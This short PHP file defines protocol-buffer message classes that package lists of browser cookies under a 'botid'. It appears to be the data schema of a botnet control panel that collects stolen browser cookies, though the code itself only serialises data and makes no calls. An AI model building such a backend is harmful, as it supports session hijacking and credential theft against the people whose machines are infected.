<?php
class message_cookies_BROWSER extends PBMessage
{
  var $wired_type = PBMessage::WIRED_LENGTH_DELIMITED;
  public function __construct($reader=null)
  {
    parent::__construct($reader);
    $this->fields["1"] = "PBString";
    $this->values["1"] = "";
    $this->fields["2"] = "PBString";
    $this->values["2"] = array();
  }
  function browser()
  {
    return $this->_get_value("1");
  }
  function set_browser($value)
  {
    return $this->_set_value("1", $value);
  }
  function cookies($offset)
  {
    $v = $this->_get_arr_value("2", $offset);
    return $v->get_value();
  }
  function append_cookies($value)
  {
    $v = $this->_add_arr_value("2");
    $v->set_value($value);
  }
  function set_cookies($index, $value)
  {
    $v = new $this->fields["2"]();
    $v->set_value($value);
    $this->_set_arr_value("2", $index, $v);
  }
  function remove_last_cookies()
  {
    $this->_remove_last_arr_value("2");
  }
  function cookies_size()
  {
    return $this->_get_arr_size("2");
  }
}
class message_cookies extends PBMessage
{
  var $wired_type = PBMessage::WIRED_LENGTH_DELIMITED;
  public function __construct($reader=null)
  {
    parent::__construct($reader);
    $this->fields["1"] = "PBString";
    $this->values["1"] = "";
    $this->fields["2"] = "message_cookies_BROWSER";
    $this->values["2"] = array();
  }
  function botid()
  {
    return $this->_get_value("1");
  }
  function set_botid($value)
  {
    return $this->_set_value("1", $value);
  }
  function browsers($offset)
  {
    return $this->_get_arr_value("2", $offset);
  }
  function add_browsers()
  {
    return $this->_add_arr_value("2");
  }
  function set_browsers($index, $value)
  {
    $this->_set_arr_value("2", $index, $value);
  }
  function remove_last_browsers()
  {
    $this->_remove_last_arr_value("2");
  }
  function browsers_size()
  {
    return $this->_get_arr_size("2");
  }
}
?>